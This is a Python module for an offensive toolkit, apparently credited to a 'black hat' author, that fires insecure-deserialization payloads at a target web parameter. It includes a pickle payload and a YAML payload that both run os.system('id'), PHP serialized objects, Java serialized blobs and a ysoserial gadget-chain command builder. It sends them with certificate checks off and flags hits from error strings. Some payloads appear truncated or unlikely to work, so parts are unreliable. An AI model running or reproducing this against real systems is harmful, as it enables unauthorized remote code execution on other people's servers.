# modules/attacks/deserialization.py

"""
Deserialization Attack Engine
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Advanced deserialization attack module for exploiting
insecure deserialization vulnerabilities in PHP, Java,
Python, and .NET applications.
"""

import base64
import binascii
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field

import requests
from requests.exceptions import RequestException


@dataclass
class DeserializationResult:
    """Represents a deserialization attack result."""
    url: str
    parameter: str
    language: str
    payload_type: str
    payload: str
    encoded_payload: str
    success: bool
    command_output: Optional[str]
    description: str


class DeserializationAttacker:
    """
    Deserialization attack engine.
    
    Exploits insecure deserialization vulnerabilities
    across multiple programming languages and frameworks.
    """
    
    PHP_PAYLOADS = {
        'basic': 'O:8:"stdClass":0:{}',
        'rce': 'O:9:"Exception":7:{s:10:"\x00*\x00message";s:3:"cmd";s:17:"\x00Exception\x00string";s:0:"";s:7:"\x00*\x00code";i:0;s:7:"\x00*\x00file";s:0:"";s:7:"\x00*\x00line";i:0;s:16:"\x00Exception\x00trace";a:0:{}s:19:"\x00Exception\x00previous";O:8:"stdClass":0:{}}',
    }
    
    JAVA_PAYLOADS = {
        'dns_check': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldN4BAQAAAAACdAAA',
        'rce_commons': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH',
    }
    
    PYTHON_PAYLOADS = {
        'pickle_rce': "cos\nsystem\n(S'id'\ntR.",
        'yaml_rce': "!!python/object/apply:os.system ['id']",
    }
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the deserialization attacker.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 30)
        self.verify_ssl = self.config.get('verify_ssl', False)
        self.callback_server = self.config.get('callback_server', '')
        
        self.results: List[DeserializationResult] = []
        self.errors: List[str] = []
    
    def test_php_deserialization(
        self,
        url: str,
        parameter: str
    ) -> List[DeserializationResult]:
        """
        Test for PHP deserialization vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            
        Returns:
            List of DeserializationResult objects
        """
        results = []
        
        for payload_name, payload in self.PHP_PAYLOADS.items():
            encoded_payloads = [
                payload,
                base64.b64encode(payload.encode()).decode(),
                binascii.hexlify(payload.encode()).decode(),
            ]
            
            for encoded in encoded_payloads:
                try:
                    data = {parameter: encoded}
                    response = self.session.post(
                        url,
                        data=data,
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )
                    
                    response_text = response.text.lower()
                    error_indicators = [
                        'unserialize', 'deserialize', '__wakeup',
                        '__destruct', 'invalid serialization',
                    ]
                    
                    success = any(indicator in response_text for indicator in error_indicators)
                    
                    result = DeserializationResult(
                        url=url,
                        parameter=parameter,
                        language='PHP',
                        payload_type=payload_name,
                        payload=payload[:200],
                        encoded_payload=encoded[:200],
                        success=success,
                        command_output=None,
                        description=f'PHP deserialization test with {payload_name} payload'
                    )
                    
                    results.append(result)
                    
                except RequestException as e:
                    self.errors.append(f"PHP deserialization test failed: {str(e)}")
                    continue
        
        self.results.extend(results)
        return results
    
    def test_java_deserialization(
        self,
        url: str,
        parameter: str
    ) -> List[DeserializationResult]:
        """
        Test for Java deserialization vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            
        Returns:
            List of DeserializationResult objects
        """
        results = []
        
        for payload_name, payload in self.JAVA_PAYLOADS.items():
            try:
                raw_bytes = base64.b64decode(payload)
                
                response = self.session.post(
                    url,
                    data=raw_bytes,
                    headers={'Content-Type': 'application/octet-stream'},
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                
                response_text = response.text.lower()
                error_indicators = [
                    'java.io', 'classnotfound', 'serialization',
                    'objectinputstream', 'invalidclass',
                ]
                
                success = any(indicator in response_text for indicator in error_indicators)
                
                result = DeserializationResult(
                    url=url,
                    parameter=parameter,
                    language='Java',
                    payload_type=payload_name,
                    payload=payload[:200],
                    encoded_payload=payload[:200],
                    success=success,
                    command_output=None,
                    description=f'Java deserialization test with {payload_name} payload'
                )
                
                results.append(result)
                
            except (RequestException, binascii.Error) as e:
                self.errors.append(f"Java deserialization test failed: {str(e)}")
                continue
        
        self.results.extend(results)
        return results
    
    def test_python_deserialization(
        self,
        url: str,
        parameter: str
    ) -> List[DeserializationResult]:
        """
        Test for Python deserialization vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            
        Returns:
            List of DeserializationResult objects
        """
        results = []
        
        for payload_name, payload in self.PYTHON_PAYLOADS.items():
            encoded_payloads = [
                payload,
                base64.b64encode(payload.encode()).decode(),
            ]
            
            for encoded in encoded_payloads:
                try:
                    data = {parameter: encoded}
                    response = self.session.post(
                        url,
                        data=data,
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )
                    
                    response_text = response.text.lower()
                    error_indicators = [
                        'pickle', 'unpickle', 'yaml.constructor',
                        'deserialize', 'unsafe',
                    ]
                    
                    success = any(indicator in response_text for indicator in error_indicators)
                    
                    result = DeserializationResult(
                        url=url,
                        parameter=parameter,
                        language='Python',
                        payload_type=payload_name,
                        payload=payload[:200],
                        encoded_payload=encoded[:200],
                        success=success,
                        command_output=None,
                        description=f'Python deserialization test with {payload_name} payload'
                    )
                    
                    results.append(result)
                    
                except RequestException as e:
                    self.errors.append(f"Python deserialization test failed: {str(e)}")
                    continue
        
        self.results.extend(results)
        return results
    
    def generate_ysoserial_payload(
        self,
        gadget: str = 'CommonsCollections1',
        command: str = 'id'
    ) -> Optional[str]:
        """
        Generate ysoserial payload reference.
        
        Args:
            gadget: Gadget chain name
            command: Command to execute
            
        Returns:
            Command string for ysoserial generation
        """
        gadgets = [
            'CommonsCollections1', 'CommonsCollections2',
            'CommonsCollections3', 'CommonsCollections4',
            'CommonsCollections5', 'CommonsCollections6',
            'CommonsBeanutils1', 'Jdk7u21',
            'Spring1', 'Spring2', 'Groovy1',
        ]
        
        if gadget in gadgets:
            return f"java -jar ysoserial.jar {gadget} '{command}' | base64"
        
        return None
    
    def run(
        self,
        url: str,
        parameter: str,
        language: str = 'auto'
    ) -> Dict[str, Any]:
        """
        Run deserialization attacks.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            language: Target language (php, java, python, auto)
            
        Returns:
            Dictionary with attack results
        """
        if language in ['auto', 'php']:
            self.test_php_deserialization(url, parameter)
        
        if language in ['auto', 'java']:
            self.test_java_deserialization(url, parameter)
        
        if language in ['auto', 'python']:
            self.test_python_deserialization(url, parameter)
        
        findings = []
        for result in self.results:
            if result.success:
                findings.append({
                    'type': f'Insecure Deserialization ({result.language})',
                    'severity': 'critical',
                    'endpoint': result.url,
                    'parameter': result.parameter,
                    'payload_type': result.payload_type,
                    'description': result.description,
                })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'language_tested': language,
            'total_tests': len(self.results),
            'vulnerabilities_found': len(findings),
        }